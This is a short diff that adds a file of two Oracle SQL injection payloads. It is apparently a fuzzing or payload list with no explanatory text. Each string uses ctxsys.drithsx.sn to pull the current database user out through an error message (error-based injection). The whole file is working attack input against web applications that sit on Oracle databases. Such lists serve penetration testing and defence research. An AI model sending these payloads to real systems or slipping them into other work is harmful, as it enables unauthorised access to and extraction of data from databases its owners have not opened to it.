@@ -1,0 +1,6 @@
+
+
+'and ctxsys.drithsx.sn(1,(select user from dual)) is not null and '1'='1
+
+
+' and 1=ctxsys.drithsx.sn(1,(select user from dual)) and 'aaaa' like 'bbbb
